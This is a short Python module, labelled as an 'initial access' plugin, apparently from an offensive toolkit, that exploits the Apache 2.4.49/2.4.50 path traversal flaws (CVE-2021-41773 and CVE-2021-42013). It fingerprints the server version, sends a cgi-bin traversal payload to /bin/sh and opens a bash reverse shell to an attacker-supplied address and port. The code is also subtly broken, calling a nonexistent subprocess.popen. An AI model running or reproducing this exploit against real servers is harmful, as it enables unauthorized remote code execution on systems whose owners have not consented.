# [PLUGIN INITIAL ACCESS] Apache 2.4.49 RCE (CVE-2021-41773 et CVE-2021-42013)

import requests
import subprocess
import os

def exploit(ip_dest, port_dest, ip_src, port_src):
    try:
        host = 'http://{0}:{1}'.format(ip_dest, port_dest)
        r = requests.get(host)
        if '49' in r.headers['Server']:
            payload = '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
        elif '50' in r.headers['Server']:
            payload = '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'
        else:
            return 'Error'
        rs = 'bash -c "/bin/sh -i >& /dev/tcp/{0}/{1} 0>&1"'.format(ip_src, port_src)
        cmd = "curl -s --path-as-is '{1}{2}' --data 'echo Content-Type: text/plain; echo; {0}'".format(rs, host, payload)
        shell = subprocess.popen(cmd) # TODO: background the command to not block the script execution
        return True
        
    except Exception as e:
        return e
